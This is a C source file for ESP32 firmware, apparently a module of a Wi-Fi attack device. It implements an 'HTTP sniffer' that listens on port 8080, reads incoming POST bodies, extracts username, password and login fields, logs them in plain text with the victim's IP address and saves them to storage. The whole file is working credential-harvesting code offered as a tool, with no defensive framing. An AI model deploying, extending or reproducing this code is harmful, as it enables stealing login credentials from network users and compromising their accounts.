#include "wifi_engine.h"
#include "esp_log.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "storage_manager.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "SNIFFER";

static TaskHandle_t s_sniffer_task = NULL;
static volatile bool s_running = false;
static int s_sniffer_fd = -1;

static void url_decode(char *s)
{
    char *src = s, *dst = s;
    while (*src) {
        if (*src == '+') { *dst++ = ' '; src++; }
        else if (*src == '%' && *(src+1) && *(src+2)) {
            char hex[3] = {src[1], src[2], 0};
            *dst++ = strtol(hex, NULL, 16);
            src += 3;
        } else {
            *dst++ = *src++;
        }
    }
    *dst = '\0';
}

static void extract_credentials(const char *body, const char *src_ip)
{
    char user[128] = {0}, pass[128] = {0};
    bool found = false;

    const char *fields[] = {"user", "pass", "login", "email", "loginID", "session_key"};
    const char *val;

    val = strstr(body, "username=");
    if (val) {
        val += 9;
        const char *end = strchr(val, '&');
        if (!end) end = body + strlen(body);
        size_t len = (end - val);
        if (len > sizeof(user) - 1) len = sizeof(user) - 1;
        strncpy(user, val, len);
        url_decode(user);
        found = true;
    }

    val = strstr(body, "password=");
    if (val) {
        val += 9;
        const char *end = strchr(val, '&');
        if (!end) end = body + strlen(body);
        size_t len = (end - val);
        if (len > sizeof(pass) - 1) len = sizeof(pass) - 1;
        strncpy(pass, val, len);
        url_decode(pass);
        found = true;
    }

    if (!found) {
        val = strstr(body, "login=");
        if (val) {
            val += 6;
            const char *end = strchr(val, '&');
            if (!end) end = body + strlen(body);
            size_t len = (end - val);
            if (len > sizeof(user) - 1) len = sizeof(user) - 1;
            strncpy(user, val, len);
            url_decode(user);
        }
    }

    if (found) {
        ESP_LOGI(TAG, "HTTP CREDENTIALS: '%s':'%s' from %s", user, pass, src_ip);
        storage_log_credential("http_sniffer", user, pass, src_ip);
    }
}

static void sniffer_task(void *arg)
{
    s_sniffer_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (s_sniffer_fd < 0) {
        ESP_LOGE(TAG, "Failed to create sniffer socket");
        s_running = false;
        vTaskDelete(NULL);
        return;
    }

    int opt = 1;
    setsockopt(s_sniffer_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(8080),
        .sin_addr = { .s_addr = INADDR_ANY },
    };

    if (bind(s_sniffer_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "Failed to bind sniffer port 8080");
        close(s_sniffer_fd);
        s_sniffer_fd = -1;
        s_running = false;
        vTaskDelete(NULL);
        return;
    }

    listen(s_sniffer_fd, 5);
    ESP_LOGI(TAG, "HTTP sniffer listening on port 8080");

    while (s_running) {
        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(s_sniffer_fd, &readfds);

        int ret = select(s_sniffer_fd + 1, &readfds, NULL, NULL, &tv);
        if (ret <= 0) continue;

        struct sockaddr_in client;
        socklen_t client_len = sizeof(client);
        int client_fd = accept(s_sniffer_fd, (struct sockaddr *)&client, &client_len);
        if (client_fd < 0) continue;

        char buf[4096];
        int len = recv(client_fd, buf, sizeof(buf) - 1, MSG_PEEK);
        if (len > 0) {
            buf[len] = '\0';

            char method[16], path[256];
            sscanf(buf, "%15s %255s", method, path);

            if (strcmp(method, "POST") == 0) {
                const char *body = strstr(buf, "\r\n\r\n");
                if (body) {
                    body += 4;
                    char src_ip[16];
                    inet_ntoa_r(client.sin_addr, src_ip, sizeof(src_ip));
                    extract_credentials(body, src_ip);
                }
            }
        }

        close(client_fd);
    }

    close(s_sniffer_fd);
    s_sniffer_fd = -1;
    s_sniffer_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t http_sniffer_start(void)
{
    if (s_running) return ESP_OK;

    s_running = true;
    xTaskCreatePinnedToCore(sniffer_task, "http_sniff", 6144, NULL, 5,
                            &s_sniffer_task, 0);
    return ESP_OK;
}

esp_err_t http_sniffer_stop(void)
{
    s_running = false;
    if (s_sniffer_fd >= 0) {
        close(s_sniffer_fd);
        s_sniffer_fd = -1;
    }
    if (s_sniffer_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        s_sniffer_task = NULL;
    }
    ESP_LOGI(TAG, "HTTP sniffer stopped");
    return ESP_OK;
}
